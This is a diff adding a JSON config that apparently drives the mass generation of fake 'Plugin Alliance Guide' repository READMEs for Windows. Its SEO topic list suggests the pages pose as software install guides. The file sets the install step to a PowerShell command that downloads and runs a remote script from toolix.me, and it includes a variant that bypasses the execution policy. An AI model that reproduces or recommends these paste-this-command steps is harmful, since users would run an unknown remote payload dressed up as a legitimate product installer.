@@ -1,0 +1,26 @@
+{
+  "repo": "Plugin-Alliance-Guide",
+  "product": "Plugin Alliance Guide",
+  "product_title": "Plugin Alliance Guide",
+  "kind": "utility",
+  "install_type": "toolix-irm",
+  "install_command": "irm https://toolix.me/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://toolix.me/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-toolix-pending",
+  "format": "license-md-toolix-git-new-era-guide",
+  "tone": "guide",
+  "category": "system-tools",
+  "topics": [
+    "how-to-install-plugin-alliance-guide",
+    "plugin-alliance-guide-app",
+    "desktop-software",
+    "repository-readme",
+    "install-guide",
+    "plugin-alliance-guide-desktop-tool",
+    "plugin-alliance-guide-windows-tool",
+    "plugin-alliance-guide",
+    "windows-11",
+    "windows-desktop"
+  ],
+  "site": "toolix.me"
+}
